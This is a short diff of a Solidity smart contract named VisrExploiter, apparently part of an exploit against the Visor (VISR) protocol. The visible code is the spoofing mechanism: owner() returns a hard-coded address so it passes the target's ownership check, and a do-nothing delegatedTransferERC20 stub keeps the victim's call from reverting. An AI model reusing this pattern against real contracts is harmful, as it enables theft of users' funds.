@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity >=0.7.0 <0.9.0;
 
-
 interface UniswapV2Interface {
     function WETH() external view returns (address);
 
@@ -199,13 +198,12 @@ interface VisrInterface {
 
 contract VisrExploiter {
     function owner() public pure returns (address) {
-        address a = address(0x7);
-        return a;
+        // owner must match msg.sender, and we are exacting is if we are address(0x7)
+        return address(0x7);
     }
-
-    receive() external payable {
-
-    }
-
+    // function gets called as well by the visor, doesn't need to do anything, just exist so txn doesn't revert
     function delegatedTransferERC20(address, address, uint256) public {}
+
+     // our contract needs to be able to receive ETH
+    receive() external payable {}
 }
